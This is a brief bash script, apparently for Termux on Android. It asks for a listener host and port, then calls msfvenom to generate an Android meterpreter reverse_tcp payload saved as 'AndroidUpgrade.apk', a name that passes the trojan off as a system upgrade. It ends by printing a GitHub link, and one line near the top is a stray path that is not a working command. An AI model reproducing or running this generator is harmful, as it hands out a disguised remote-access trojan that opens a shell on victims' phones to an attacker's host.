#!/bin/bash 
contenido/data/data/com.termux/files/usr/share
clear
echo ""
...
read -p $"   Lhost: " lhost
read -p $"   Lport: " lport
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $PREFIX/usr/delorian/android/AndroidUpgrade.apk
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
